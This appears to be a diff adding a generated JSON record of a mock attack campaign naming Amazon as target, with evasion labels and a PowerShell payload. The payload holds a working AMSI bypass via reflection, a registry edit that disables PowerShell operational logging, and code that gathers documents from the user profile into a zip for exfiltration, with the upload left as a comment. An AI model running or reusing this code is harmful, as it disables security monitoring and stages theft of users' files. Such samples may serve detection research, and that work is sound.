@@ -1,0 +1,13 @@
+{
+  "organization": "Amazon",
+  "campaign_type": "data_exfiltration",
+  "evasion_techniques": [
+    "etw_bypass",
+    "amsi_bypass",
+    "polymorphic_code",
+    "string_obfuscation"
+  ],
+  "payload": "# C8TaCT4s1PtgP4SlgTig\n# Generated: 2025-11-03T12:20:52.710781\n# System: ZvcMEU2VvwdoQBM\n# Process: A51Q6cKHFpps\n\n\n# AMSI Bypass via Reflection\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n\n\n# ETW Bypass via Registry\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winevt\\Channels\\Microsoft-Windows-PowerShell/Operational\" -Name \"Enabled\" -ErrorAction SilentlyContinue\n\n\n\n# Data exfiltration\n$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10\n\nif ($sensitiveFiles) {\n    $TS3jYWenZip = \"$env:TEMP\\data.zip\"\n    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $TS3jYWenZip -Force\n    # Upload logic would go here\n}\n",
+  "generated_at": "2025-11-03T12:20:52.710788",
+  "signature": "8c48b80d560df434e5bd541dd2b0cdcc0d812da3a4229d72a9054ddfffcbcb88"
+}
